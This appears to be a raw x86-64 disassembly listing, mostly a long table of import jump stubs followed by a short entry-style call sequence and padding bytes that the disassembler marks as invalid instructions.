  40a910:	ff 25 76 7e 15 00    	jmp    *0x157e76(%rip)        # 0x56278c
  40a916:	90                   	nop
  40a917:	90                   	nop
  40a918:	ff 25 66 7e 15 00    	jmp    *0x157e66(%rip)        # 0x562784
  40a91e:	90                   	nop
  40a91f:	90                   	nop
  40a920:	ff 25 8e 7e 15 00    	jmp    *0x157e8e(%rip)        # 0x5627b4
  40a926:	90                   	nop
  40a927:	90                   	nop
  40a928:	ff 25 66 7e 15 00    	jmp    *0x157e66(%rip)        # 0x562794
  40a92e:	90                   	nop
  40a92f:	90                   	nop
  40a930:	ff 25 1e 7e 15 00    	jmp    *0x157e1e(%rip)        # 0x562754
  40a936:	90                   	nop
  40a937:	90                   	nop
  40a938:	ff 25 6e 7e 15 00    	jmp    *0x157e6e(%rip)        # 0x5627ac
  40a93e:	90                   	nop
  40a93f:	90                   	nop
  40a940:	ff 25 76 7e 15 00    	jmp    *0x157e76(%rip)        # 0x5627bc
  40a946:	90                   	nop
  40a947:	90                   	nop
  40a948:	ff 25 ee 7d 15 00    	jmp    *0x157dee(%rip)        # 0x56273c
  40a94e:	90                   	nop
  40a94f:	90                   	nop
  40a950:	ff 25 06 7e 15 00    	jmp    *0x157e06(%rip)        # 0x56275c
  40a956:	90                   	nop
  40a957:	90                   	nop
  40a958:	ff 25 d6 7d 15 00    	jmp    *0x157dd6(%rip)        # 0x562734
  40a95e:	90                   	nop
  40a95f:	90                   	nop
  40a960:	ff 25 de 7d 15 00    	jmp    *0x157dde(%rip)        # 0x562744
  40a966:	90                   	nop
  40a967:	90                   	nop
  40a968:	ff 25 2e 7d 15 00    	jmp    *0x157d2e(%rip)        # 0x56269c
  40a96e:	90                   	nop
  40a96f:	90                   	nop
  40a970:	ff 25 7e 7d 15 00    	jmp    *0x157d7e(%rip)        # 0x5626f4
  40a976:	90                   	nop
  40a977:	90                   	nop
  40a978:	ff 25 6e 7d 15 00    	jmp    *0x157d6e(%rip)        # 0x5626ec
  40a97e:	90                   	nop
  40a97f:	90                   	nop
  40a980:	ff 25 f6 7c 15 00    	jmp    *0x157cf6(%rip)        # 0x56267c
  40a986:	90                   	nop
  40a987:	90                   	nop
  40a988:	ff 25 76 7d 15 00    	jmp    *0x157d76(%rip)        # 0x562704
  40a98e:	90                   	nop
  40a98f:	90                   	nop
  40a990:	ff 25 0e 7e 15 00    	jmp    *0x157e0e(%rip)        # 0x5627a4
  40a996:	90                   	nop
  40a997:	90                   	nop
  40a998:	ff 25 16 7d 15 00    	jmp    *0x157d16(%rip)        # 0x5626b4
  40a99e:	90                   	nop
  40a99f:	90                   	nop
  40a9a0:	ff 25 ee 7c 15 00    	jmp    *0x157cee(%rip)        # 0x562694
  40a9a6:	90                   	nop
  40a9a7:	90                   	nop
  40a9a8:	ff 25 66 7d 15 00    	jmp    *0x157d66(%rip)        # 0x562714
  40a9ae:	90                   	nop
  40a9af:	90                   	nop
  40a9b0:	ff 25 26 7e 15 00    	jmp    *0x157e26(%rip)        # 0x5627dc
  40a9b6:	90                   	nop
  40a9b7:	90                   	nop
  40a9b8:	ff 25 66 7d 15 00    	jmp    *0x157d66(%rip)        # 0x562724
  40a9be:	90                   	nop
  40a9bf:	90                   	nop
  40a9c0:	ff 25 0e 7d 15 00    	jmp    *0x157d0e(%rip)        # 0x5626d4
  40a9c6:	90                   	nop
  40a9c7:	90                   	nop
  40a9c8:	ff 25 7e 7d 15 00    	jmp    *0x157d7e(%rip)        # 0x56274c
  40a9ce:	90                   	nop
  40a9cf:	90                   	nop
  40a9d0:	ff 25 96 7d 15 00    	jmp    *0x157d96(%rip)        # 0x56276c
  40a9d6:	90                   	nop
  40a9d7:	90                   	nop
  40a9d8:	ff 25 86 7d 15 00    	jmp    *0x157d86(%rip)        # 0x562764
  40a9de:	90                   	nop
  40a9df:	90                   	nop
  40a9e0:	ff 25 e6 7d 15 00    	jmp    *0x157de6(%rip)        # 0x5627cc
  40a9e6:	90                   	nop
  40a9e7:	90                   	nop
  40a9e8:	ff 25 f6 7d 15 00    	jmp    *0x157df6(%rip)        # 0x5627e4
  40a9ee:	90                   	nop
  40a9ef:	90                   	nop
  40a9f0:	ff 25 a6 7d 15 00    	jmp    *0x157da6(%rip)        # 0x56279c
  40a9f6:	90                   	nop
  40a9f7:	90                   	nop
  40a9f8:	ff 25 c6 7d 15 00    	jmp    *0x157dc6(%rip)        # 0x5627c4
  40a9fe:	90                   	nop
  40a9ff:	90                   	nop
  40aa00:	ff 25 16 7d 15 00    	jmp    *0x157d16(%rip)        # 0x56271c
  40aa06:	90                   	nop
  40aa07:	90                   	nop
  40aa08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40aa0f:	00 
  40aa10:	ff 25 a6 7a 15 00    	jmp    *0x157aa6(%rip)        # 0x5624bc
  40aa16:	90                   	nop
  40aa17:	90                   	nop
  40aa18:	ff 25 e6 7a 15 00    	jmp    *0x157ae6(%rip)        # 0x562504
  40aa1e:	90                   	nop
  40aa1f:	90                   	nop
  40aa20:	ff 25 b6 7a 15 00    	jmp    *0x157ab6(%rip)        # 0x5624dc
  40aa26:	90                   	nop
  40aa27:	90                   	nop
  40aa28:	ff 25 86 7a 15 00    	jmp    *0x157a86(%rip)        # 0x5624b4
  40aa2e:	90                   	nop
  40aa2f:	90                   	nop
  40aa30:	ff 25 de 7a 15 00    	jmp    *0x157ade(%rip)        # 0x562514
  40aa36:	90                   	nop
  40aa37:	90                   	nop
  40aa38:	ff 25 ce 7a 15 00    	jmp    *0x157ace(%rip)        # 0x56250c
  40aa3e:	90                   	nop
  40aa3f:	90                   	nop
  40aa40:	ff 25 9e 7a 15 00    	jmp    *0x157a9e(%rip)        # 0x5624e4
  40aa46:	90                   	nop
  40aa47:	90                   	nop
  40aa48:	ff 25 ce 7a 15 00    	jmp    *0x157ace(%rip)        # 0x56251c
  40aa4e:	90                   	nop
  40aa4f:	90                   	nop
  40aa50:	ff 25 9e 7a 15 00    	jmp    *0x157a9e(%rip)        # 0x5624f4
  40aa56:	90                   	nop
  40aa57:	90                   	nop
  40aa58:	ff 25 8e 7a 15 00    	jmp    *0x157a8e(%rip)        # 0x5624ec
  40aa5e:	90                   	nop
  40aa5f:	90                   	nop
  40aa60:	ff 25 6e 7a 15 00    	jmp    *0x157a6e(%rip)        # 0x5624d4
  40aa66:	90                   	nop
  40aa67:	90                   	nop
  40aa68:	ff 25 8e 7a 15 00    	jmp    *0x157a8e(%rip)        # 0x5624fc
  40aa6e:	90                   	nop
  40aa6f:	90                   	nop
  40aa70:	ff 25 36 7a 15 00    	jmp    *0x157a36(%rip)        # 0x5624ac
  40aa76:	90                   	nop
  40aa77:	90                   	nop
  40aa78:	ff 25 26 7a 15 00    	jmp    *0x157a26(%rip)        # 0x5624a4
  40aa7e:	90                   	nop
  40aa7f:	90                   	nop
  40aa80:	ff 25 3e 7a 15 00    	jmp    *0x157a3e(%rip)        # 0x5624c4
  40aa86:	90                   	nop
  40aa87:	90                   	nop
  40aa88:	ff 25 0e 7a 15 00    	jmp    *0x157a0e(%rip)        # 0x56249c
  40aa8e:	90                   	nop
  40aa8f:	90                   	nop
  40aa90:	ff 25 36 7a 15 00    	jmp    *0x157a36(%rip)        # 0x5624cc
  40aa96:	90                   	nop
  40aa97:	90                   	nop
  40aa98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40aa9f:	00 
  40aaa0:	ff 25 be 7d 15 00    	jmp    *0x157dbe(%rip)        # 0x562864
  40aaa6:	90                   	nop
  40aaa7:	90                   	nop
  40aaa8:	ff 25 ae 7d 15 00    	jmp    *0x157dae(%rip)        # 0x56285c
  40aaae:	90                   	nop
  40aaaf:	90                   	nop
  40aab0:	ff 25 0e 7e 15 00    	jmp    *0x157e0e(%rip)        # 0x5628c4
  40aab6:	90                   	nop
  40aab7:	90                   	nop
  40aab8:	ff 25 76 7d 15 00    	jmp    *0x157d76(%rip)        # 0x562834
  40aabe:	90                   	nop
  40aabf:	90                   	nop
  40aac0:	ff 25 4e 7d 15 00    	jmp    *0x157d4e(%rip)        # 0x562814
  40aac6:	90                   	nop
  40aac7:	90                   	nop
  40aac8:	ff 25 a6 7d 15 00    	jmp    *0x157da6(%rip)        # 0x562874
  40aace:	90                   	nop
  40aacf:	90                   	nop
  40aad0:	ff 25 be 7d 15 00    	jmp    *0x157dbe(%rip)        # 0x562894
  40aad6:	90                   	nop
  40aad7:	90                   	nop
  40aad8:	ff 25 ce 7d 15 00    	jmp    *0x157dce(%rip)        # 0x5628ac
  40aade:	90                   	nop
  40aadf:	90                   	nop
  40aae0:	ff 25 16 7d 15 00    	jmp    *0x157d16(%rip)        # 0x5627fc
  40aae6:	90                   	nop
  40aae7:	90                   	nop
  40aae8:	ff 25 56 7d 15 00    	jmp    *0x157d56(%rip)        # 0x562844
  40aaee:	90                   	nop
  40aaef:	90                   	nop
  40aaf0:	ff 25 46 7d 15 00    	jmp    *0x157d46(%rip)        # 0x56283c
  40aaf6:	90                   	nop
  40aaf7:	90                   	nop
  40aaf8:	ff 25 2e 7d 15 00    	jmp    *0x157d2e(%rip)        # 0x56282c
  40aafe:	90                   	nop
  40aaff:	90                   	nop
  40ab00:	ff 25 86 7d 15 00    	jmp    *0x157d86(%rip)        # 0x56288c
  40ab06:	90                   	nop
  40ab07:	90                   	nop
  40ab08:	ff 25 5e 7d 15 00    	jmp    *0x157d5e(%rip)        # 0x56286c
  40ab0e:	90                   	nop
  40ab0f:	90                   	nop
  40ab10:	ff 25 8e 7d 15 00    	jmp    *0x157d8e(%rip)        # 0x5628a4
  40ab16:	90                   	nop
  40ab17:	90                   	nop
  40ab18:	ff 25 06 7d 15 00    	jmp    *0x157d06(%rip)        # 0x562824
  40ab1e:	90                   	nop
  40ab1f:	90                   	nop
  40ab20:	ff 25 26 7d 15 00    	jmp    *0x157d26(%rip)        # 0x56284c
  40ab26:	90                   	nop
  40ab27:	90                   	nop
  40ab28:	ff 25 4e 7d 15 00    	jmp    *0x157d4e(%rip)        # 0x56287c
  40ab2e:	90                   	nop
  40ab2f:	90                   	nop
  40ab30:	ff 25 4e 7d 15 00    	jmp    *0x157d4e(%rip)        # 0x562884
  40ab36:	90                   	nop
  40ab37:	90                   	nop
  40ab38:	ff 25 5e 7d 15 00    	jmp    *0x157d5e(%rip)        # 0x56289c
  40ab3e:	90                   	nop
  40ab3f:	90                   	nop
  40ab40:	ff 25 be 7c 15 00    	jmp    *0x157cbe(%rip)        # 0x562804
  40ab46:	90                   	nop
  40ab47:	90                   	nop
  40ab48:	ff 25 a6 7c 15 00    	jmp    *0x157ca6(%rip)        # 0x5627f4
  40ab4e:	90                   	nop
  40ab4f:	90                   	nop
  40ab50:	ff 25 b6 7c 15 00    	jmp    *0x157cb6(%rip)        # 0x56280c
  40ab56:	90                   	nop
  40ab57:	90                   	nop
  40ab58:	ff 25 56 7d 15 00    	jmp    *0x157d56(%rip)        # 0x5628b4
  40ab5e:	90                   	nop
  40ab5f:	90                   	nop
  40ab60:	ff 25 ee 7c 15 00    	jmp    *0x157cee(%rip)        # 0x562854
  40ab66:	90                   	nop
  40ab67:	90                   	nop
  40ab68:	ff 25 ae 7c 15 00    	jmp    *0x157cae(%rip)        # 0x56281c
  40ab6e:	90                   	nop
  40ab6f:	90                   	nop
  40ab70:	ff 25 46 7d 15 00    	jmp    *0x157d46(%rip)        # 0x5628bc
  40ab76:	90                   	nop
  40ab77:	90                   	nop
  40ab78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40ab7f:	00 
  40ab80:	ff 25 ae 7a 15 00    	jmp    *0x157aae(%rip)        # 0x562634
  40ab86:	90                   	nop
  40ab87:	90                   	nop
  40ab88:	ff 25 9e 7a 15 00    	jmp    *0x157a9e(%rip)        # 0x56262c
  40ab8e:	90                   	nop
  40ab8f:	90                   	nop
  40ab90:	ff 25 f6 79 15 00    	jmp    *0x1579f6(%rip)        # 0x56258c
  40ab96:	90                   	nop
  40ab97:	90                   	nop
  40ab98:	ff 25 f6 79 15 00    	jmp    *0x1579f6(%rip)        # 0x562594
  40ab9e:	90                   	nop
  40ab9f:	90                   	nop
  40aba0:	ff 25 a6 79 15 00    	jmp    *0x1579a6(%rip)        # 0x56254c
  40aba6:	90                   	nop
  40aba7:	90                   	nop
  40aba8:	ff 25 4e 7a 15 00    	jmp    *0x157a4e(%rip)        # 0x5625fc
  40abae:	90                   	nop
  40abaf:	90                   	nop
  40abb0:	ff 25 3e 7a 15 00    	jmp    *0x157a3e(%rip)        # 0x5625f4
  40abb6:	90                   	nop
  40abb7:	90                   	nop
  40abb8:	ff 25 b6 79 15 00    	jmp    *0x1579b6(%rip)        # 0x562574
  40abbe:	90                   	nop
  40abbf:	90                   	nop
  40abc0:	ff 25 96 79 15 00    	jmp    *0x157996(%rip)        # 0x56255c
  40abc6:	90                   	nop
  40abc7:	90                   	nop
  40abc8:	ff 25 ce 79 15 00    	jmp    *0x1579ce(%rip)        # 0x56259c
  40abce:	90                   	nop
  40abcf:	90                   	nop
  40abd0:	ff 25 ae 79 15 00    	jmp    *0x1579ae(%rip)        # 0x562584
  40abd6:	90                   	nop
  40abd7:	90                   	nop
  40abd8:	ff 25 0e 7a 15 00    	jmp    *0x157a0e(%rip)        # 0x5625ec
  40abde:	90                   	nop
  40abdf:	90                   	nop
  40abe0:	ff 25 1e 7a 15 00    	jmp    *0x157a1e(%rip)        # 0x562604
  40abe6:	90                   	nop
  40abe7:	90                   	nop
  40abe8:	ff 25 c6 79 15 00    	jmp    *0x1579c6(%rip)        # 0x5625b4
  40abee:	90                   	nop
  40abef:	90                   	nop
  40abf0:	ff 25 86 79 15 00    	jmp    *0x157986(%rip)        # 0x56257c
  40abf6:	90                   	nop
  40abf7:	90                   	nop
  40abf8:	ff 25 2e 79 15 00    	jmp    *0x15792e(%rip)        # 0x56252c
  40abfe:	90                   	nop
  40abff:	90                   	nop
  40ac00:	ff 25 66 79 15 00    	jmp    *0x157966(%rip)        # 0x56256c
  40ac06:	90                   	nop
  40ac07:	90                   	nop
  40ac08:	ff 25 c6 79 15 00    	jmp    *0x1579c6(%rip)        # 0x5625d4
  40ac0e:	90                   	nop
  40ac0f:	90                   	nop
  40ac10:	ff 25 f6 79 15 00    	jmp    *0x1579f6(%rip)        # 0x56260c
  40ac16:	90                   	nop
  40ac17:	90                   	nop
  40ac18:	ff 25 3e 7a 15 00    	jmp    *0x157a3e(%rip)        # 0x56265c
  40ac1e:	90                   	nop
  40ac1f:	90                   	nop
  40ac20:	ff 25 2e 7a 15 00    	jmp    *0x157a2e(%rip)        # 0x562654
  40ac26:	90                   	nop
  40ac27:	90                   	nop
  40ac28:	ff 25 36 79 15 00    	jmp    *0x157936(%rip)        # 0x562564
  40ac2e:	90                   	nop
  40ac2f:	90                   	nop
  40ac30:	ff 25 a6 79 15 00    	jmp    *0x1579a6(%rip)        # 0x5625dc
  40ac36:	90                   	nop
  40ac37:	90                   	nop
  40ac38:	ff 25 66 79 15 00    	jmp    *0x157966(%rip)        # 0x5625a4
  40ac3e:	90                   	nop
  40ac3f:	90                   	nop
  40ac40:	ff 25 0e 79 15 00    	jmp    *0x15790e(%rip)        # 0x562554
  40ac46:	90                   	nop
  40ac47:	90                   	nop
  40ac48:	ff 25 5e 79 15 00    	jmp    *0x15795e(%rip)        # 0x5625ac
  40ac4e:	90                   	nop
  40ac4f:	90                   	nop
  40ac50:	ff 25 be 79 15 00    	jmp    *0x1579be(%rip)        # 0x562614
  40ac56:	90                   	nop
  40ac57:	90                   	nop
  40ac58:	ff 25 be 79 15 00    	jmp    *0x1579be(%rip)        # 0x56261c
  40ac5e:	90                   	nop
  40ac5f:	90                   	nop
  40ac60:	ff 25 be 79 15 00    	jmp    *0x1579be(%rip)        # 0x562624
  40ac66:	90                   	nop
  40ac67:	90                   	nop
  40ac68:	ff 25 de 79 15 00    	jmp    *0x1579de(%rip)        # 0x56264c
  40ac6e:	90                   	nop
  40ac6f:	90                   	nop
  40ac70:	ff 25 ce 78 15 00    	jmp    *0x1578ce(%rip)        # 0x562544
  40ac76:	90                   	nop
  40ac77:	90                   	nop
  40ac78:	ff 25 be 79 15 00    	jmp    *0x1579be(%rip)        # 0x56263c
  40ac7e:	90                   	nop
  40ac7f:	90                   	nop
  40ac80:	ff 25 b6 78 15 00    	jmp    *0x1578b6(%rip)        # 0x56253c
  40ac86:	90                   	nop
  40ac87:	90                   	nop
  40ac88:	ff 25 b6 79 15 00    	jmp    *0x1579b6(%rip)        # 0x562644
  40ac8e:	90                   	nop
  40ac8f:	90                   	nop
  40ac90:	ff 25 36 79 15 00    	jmp    *0x157936(%rip)        # 0x5625cc
  40ac96:	90                   	nop
  40ac97:	90                   	nop
  40ac98:	ff 25 96 78 15 00    	jmp    *0x157896(%rip)        # 0x562534
  40ac9e:	90                   	nop
  40ac9f:	90                   	nop
  40aca0:	ff 25 16 79 15 00    	jmp    *0x157916(%rip)        # 0x5625bc
  40aca6:	90                   	nop
  40aca7:	90                   	nop
  40aca8:	ff 25 b6 79 15 00    	jmp    *0x1579b6(%rip)        # 0x562664
  40acae:	90                   	nop
  40acaf:	90                   	nop
  40acb0:	ff 25 0e 79 15 00    	jmp    *0x15790e(%rip)        # 0x5625c4
  40acb6:	90                   	nop
  40acb7:	90                   	nop
  40acb8:	ff 25 26 79 15 00    	jmp    *0x157926(%rip)        # 0x5625e4
  40acbe:	90                   	nop
  40acbf:	90                   	nop
  40acc0:	48 83 ec 28          	sub    $0x28,%rsp
  40acc4:	e8 87 aa ff ff       	call   0x405750
  40acc9:	44 8b 0d 30 03 00 00 	mov    0x330(%rip),%r9d        # 0x40b000
  40acd0:	4c 8b 05 f9 67 15 00 	mov    0x1567f9(%rip),%r8        # 0x5614d0
  40acd7:	31 d2                	xor    %edx,%edx
  40acd9:	48 8b 0d f8 67 15 00 	mov    0x1567f8(%rip),%rcx        # 0x5614d8
  40ace0:	48 83 c4 28          	add    $0x28,%rsp
  40ace4:	e9 b7 8e ff ff       	jmp    0x403ba0
  40ace9:	90                   	nop
  40acea:	90                   	nop
  40aceb:	90                   	nop
  40acec:	90                   	nop
  40aced:	90                   	nop
  40acee:	90                   	nop
  40acef:	90                   	nop
  40acf0:	ff                   	(bad)
  40acf1:	ff                   	(bad)
  40acf2:	ff                   	(bad)
  40acf3:	ff                   	(bad)
  40acf4:	ff                   	(bad)
  40acf5:	ff                   	(bad)
  40acf6:	ff                   	(bad)
  40acf7:	ff 00                	incl   (%rax)
  40acf9:	00 00                	add    %al,(%rax)
  40acfb:	00 00                	add    %al,(%rax)
  40acfd:	00 00                	add    %al,(%rax)
  40acff:	00 ff                	add    %bh,%bh
  40ad01:	ff                   	(bad)
  40ad02:	ff                   	(bad)
  40ad03:	ff                   	(bad)
  40ad04:	ff                   	(bad)
  40ad05:	ff                   	(bad)
  40ad06:	ff                   	(bad)
  40ad07:	ff 00                	incl   (%rax)
  40ad09:	00 00                	add    %al,(%rax)
  40ad0b:	00 00                	add    %al,(%rax)
  40ad0d:	00 00                	add    %al,(%rax)
	...
